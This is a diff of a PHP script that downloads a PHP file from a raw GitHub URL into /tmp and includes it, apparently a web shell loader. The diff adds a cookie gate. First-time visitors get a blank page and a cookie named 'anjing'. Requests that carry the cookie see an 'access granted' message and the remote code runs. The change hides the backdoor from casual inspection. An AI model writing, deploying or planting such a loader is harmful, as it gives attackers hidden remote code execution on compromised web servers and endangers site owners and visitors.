@@ -2,7 +2,7 @@
 
 $url = 'https://raw.githubusercontent.com/dan1584/asfdas/main/Aks525jkwuy.php';
 
-$targetDir = '/tmp'; // Menyimpan file ke direktori /tmp
+$targetDir = '/tmp';
 
 if (!is_dir($targetDir)) {
     mkdir($targetDir, 0777, true);
@@ -11,17 +11,27 @@ if (!is_dir($targetDir)) {
 $randomFileName = uniqid() . '.php';
 $targetFile = $targetDir . '/' . $randomFileName;
 
-setcookie("burungbebek", "true", time() + 9999999, "/");
-
 if (!file_exists($targetFile)) {
     $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_HEADER, false);
     $response = curl_exec($ch);
     curl_close($ch);
+
     file_put_contents($targetFile, $response);
 }
 
-include $targetFile;
+if (!isset($_COOKIE['anjing'])) {
+    setcookie("anjing", "anjing", time() + 3600, "/");
+    echo "";
+    exit;
+}
+
+if (isset($_COOKIE['anjing']) && $_COOKIE['anjing'] == "anjing") {
+    echo "Cookie anjing terdeteksi! Akses diberikan.<br>";
+    include $targetFile;
+} else {
+    echo "";
+}
 
 ?>
